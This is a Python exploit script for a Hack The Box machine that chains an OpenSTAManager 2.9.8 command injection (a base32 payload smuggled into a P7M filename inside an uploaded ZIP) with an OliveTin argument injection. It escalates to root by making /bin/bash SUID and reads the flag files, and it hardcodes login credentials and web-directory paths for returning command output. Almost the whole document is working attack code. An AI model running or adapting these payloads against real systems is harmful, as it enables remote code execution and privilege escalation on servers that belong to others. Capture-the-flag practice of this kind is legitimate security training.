#!/usr/bin/env python3
"""Standalone OpenSTAManager 2.9.8 P7M RCE (CVE-2025-69212) -> user + root.

Isolated from the full recon so it iterates in seconds. The 2.9.8 decodeP7M runs
  exec('openssl smime ... -in "'.$file.'" ...')   # $file double-quoted, unescaped
so a ZIP entry named z$(<base32 cmd>|base32 -d|bash).p7m runs commands. HTB boxes
usually block outbound, so we don't use a reverse shell: the payload WRITES its
output to a web-served file under the docroot and we fetch it over HTTP. Then it
reads user.txt and, if a root-owned OliveTin is on 127.0.0.1:1337, fires
CVE-2026-27626 for root.txt.

    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s
    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s 14 48

Optional 4th/5th args pin the module/plugin id. Run from the HTB VPN host.
Authorized targets only.
"""
import base64
import io
import os
import re
import sys
import time
import urllib.parse
import urllib.request
import http.cookiejar
import zipfile

UA = "Mozilla/5.0 osm"


def log(tag, msg):
    c = {"+": "\033[92m", "!": "\033[91m", "*": "\033[96m", ".": "\033[90m"}.get(tag, "")
    print(f"  {c}[{tag}]\033[0m {msg}")


# ---- HTTP session -------------------------------------------------------
def session():
    jar = http.cookiejar.CookieJar()
    o = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    o.addheaders = [("User-Agent", UA)]
    return o


def get(o, url):
    try:
        with o.open(url, timeout=15) as r:
            return r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(200000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""


def post(o, url, data, headers=None):
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        with o.open(req, timeout=20) as r:
            return r.status, r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(200000).decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return None, str(e)


# ---- login --------------------------------------------------------------
def login(o, base, user, pw):
    page = get(o, base + "/index.php")
    if "brute" in page.lower() and "badge-danger" in page.lower():
        log("!", "app is brute-locked right now (timeout page) — wait / reset box")
        return False
    st, body = post(o, base + "/index.php?op=login",
                    urllib.parse.urlencode({"op": "login", "username": user,
                                            "password": pw}).encode())
    home = get(o, base + "/index.php").lower()
    ok = ("logout" in home or "id_module=" in home) and 'name="password"' not in home
    log("+" if ok else "!", f"login {user}:{pw} -> {'OK' if ok else 'FAILED'}")
    return ok


# ---- plugin discovery ---------------------------------------------------
def find_plugins(o, base):
    """Return ALL (mid, pid) candidates that look like the importFE_ZIP plugin,
    strongest first. 'fattura' alone is too generic (it's an invoicing app), so
    we require an import/FE-ZIP-specific marker and a real id_plugin."""
    home = get(o, base + "/index.php")
    mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
    strong = ("importfe", "fe_zip", "importa fe", "importazione fe", "blob1",
              ".p7m", "p7m")
    cands = []
    for mid in mids:
        page = get(o, f"{base}/controller.php?id_module={mid}").lower()
        score = sum(k in page for k in strong)
        pids = re.findall(r"id_plugin=(\d+)", page)
        if score and pids:
            for pid in dict.fromkeys(pids):
                cands.append((score, mid, pid))
    cands.sort(reverse=True)
    out = [(m, p) for _s, m, p in cands]
    if out:
        log("+", "importFE_ZIP candidates: "
            + ", ".join(f"{m}/{p}" for m, p in out[:6]))
    else:
        log("!", "no importFE_ZIP module matched; will try scryer's known 14/21")
        out = [("14", "21")]
    return out


# ---- payload / upload ---------------------------------------------------
def p7m_name(cmd):
    b32 = base64.b32encode(cmd.encode()).decode()
    return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"


def zip_of(entry):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(entry, b"<?xml version='1.0'?><x/>")
    return buf.getvalue()


def multipart(field, fname, content):
    b = "----osm" + base64.b16encode(zip_of("x")[:6]).decode()
    pre = ("--" + b + "\r\n"
           f'Content-Disposition: form-data; name="{field}"; filename="{fname}"\r\n'
           "Content-Type: application/octet-stream\r\n\r\n")
    return (pre.encode() + content + f"\r\n--{b}--\r\n".encode(),
            "multipart/form-data; boundary=" + b)


def upload(o, base, mid, pid, cmd):
    """Upload the malicious ZIP the way the save handler expects:
    field blob1, upload name *.zip, the .p7m injection as the ZIP entry."""
    entry = p7m_name(cmd)
    body, ct = multipart("blob1", "invoice.zip", zip_of(entry))
    url = f"{base}/actions.php?op=save&id_module={mid}&id_plugin={pid}"
    st, resp = post(o, url, body,
                    {"Content-Type": ct, "X-Requested-With": "XMLHttpRequest"})
    return st, resp


# ---- output-file channel (no egress needed) ----------------------------
# HTB boxes commonly block outbound, so instead of a reverse connection we make
# the payload WRITE command output to a web-served file and we fetch it. Docroot
# is confirmed /var/www/html/openstamanager; try it + the app's writable dirs.
WRITE_DIRS = [
    "/var/www/html/openstamanager",
    "/var/www/html/openstamanager/files",
    "/var/www/html/openstamanager/tmp",
    "/var/www/html/openstamanager/backup",
    ".",
]
# URL path (relative to base) each dir maps to, for fetching the output back
URL_PREFIX = {"/var/www/html/openstamanager": "", "/var/www/html/openstamanager/files": "files/",
              "/var/www/html/openstamanager/tmp": "tmp/",
              "/var/www/html/openstamanager/backup": "backup/", ".": ""}


def run_cmd(o, base, mid, pid, _lhost, cmd, wait=6):
    """Inject a payload that writes `cmd` output into web-served dirs, then fetch
    it back over HTTP. Returns the captured output (or '')."""
    token = "s" + os.urandom(4).hex() + "z"
    name = token + ".txt"
    marker = "OK" + token
    dirs = " ".join(f"'{d}'" for d in WRITE_DIRS)
    # decoded by base32 -> may contain '/'. write marker+output to every dir.
    payload = (f"for d in {dirs}; do {{ echo {marker}; {cmd}; }} "
               f"> \"$d/{name}\" 2>/dev/null; done")
    upload(o, base, mid, pid, payload)
    deadline = time.time() + wait
    urls = [base + "/" + p + name for p in dict.fromkeys(URL_PREFIX.values())]
    while time.time() < deadline:
        for u in urls:
            body = get(o, u)
            if marker in body:
                return body.split(marker, 1)[1].strip()
        time.sleep(0.4)
    return ""


# ---- OliveTin root ------------------------------------------------------
def olivetin_root(o, base, mid, pid, lhost):
    log("*", "checking for a local OliveTin (127.0.0.1:1337) …")
    listening = run_cmd(o, base, mid, pid, lhost,
                        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    if ":1337" not in listening:
        log(".", "no OliveTin on :1337 — root step skipped")
        return ""
    log("+", "OliveTin on 127.0.0.1:1337 — firing CVE-2026-27626 (mysqldump inj)")
    inject = ("x' ; chmod u+s /bin/bash ; cp /root/root.txt /tmp/.rf 2>/dev/null ; "
              "chmod 644 /tmp/.rf 2>/dev/null ; #")
    import json
    body = json.dumps({"actionId": "Backup Database",
                       "arguments": {"db_pass": inject}})
    fire = (f"curl -s -m 8 -X POST http://127.0.0.1:1337/api/StartActionAndWait "
            f"-H 'Content-Type: application/json' -d {json.dumps(body)}")
    run_cmd(o, base, mid, pid, lhost, fire)
    return run_cmd(o, base, mid, pid, lhost,
                   "cat /tmp/.rf 2>/dev/null; /bin/bash -p -c 'id; cat /root/root.txt'")


# ---- main ---------------------------------------------------------------
def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    user, pw = sys.argv[2], sys.argv[3]
    log("*", f"target {base}  (output-file channel — no reverse connection)")

    o = session()
    if not login(o, base, user, pw):
        sys.exit(2)

    # explicit module/plugin override: argv[4]=module argv[5]=plugin
    if len(sys.argv) > 5:
        cands = [(sys.argv[4], sys.argv[5])]
        log("*", f"using given module/plugin {cands[0][0]}/{cands[0][1]}")
    else:
        cands = find_plugins(o, base)

    # Try each candidate module: fire the injection (writes `id;hostname` output
    # to a web-served file) and see which one actually returns exec output.
    mid = pid = None
    for m, p in cands[:8]:
        log("*", f"testing exec on module {m}/{p} …")
        probe = run_cmd(o, base, m, p, None, "id; hostname")
        if "uid=" in probe:
            mid, pid = m, p
            log("+", f"RCE via module {m}/{p}:")
            for ln in probe.strip().splitlines():
                print("      " + ln)
            break
        # show the raw upload response for this module as a diagnostic
        st, resp = upload(o, base, m, p, "id")
        log(".", f"  no output; upload HTTP {st}, body {resp.strip()[:110]!r}")
    if not mid:
        log("!", "exec fired on no module via the output-file channel.")
        log(".", "if the upload bodies above show an openssl/XML/exception error, the "
                 "injection ran but couldn't write a web-readable file (docroot not "
                 "writable) — tell me and I'll switch the write target.")
        sys.exit(4)

    flag = run_cmd(o, base, mid, pid, None,
                   "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
    m = re.search(r"[0-9a-f]{32}", flag)
    if m:
        log("+", f"USER FLAG: {m.group(0)}")
    else:
        log(".", f"user.txt not in the usual spots; raw: {flag.strip()[:120]!r}")

    root = olivetin_root(o, base, mid, pid, None)
    r = re.search(r"[0-9a-f]{32}", root)
    if r:
        log("+", f"ROOT FLAG: {r.group(0)}")
    elif "uid=0" in root:
        log("+", "root shell confirmed (SUID /bin/bash); run `/bin/bash -p`")


if __name__ == "__main__":
    main()
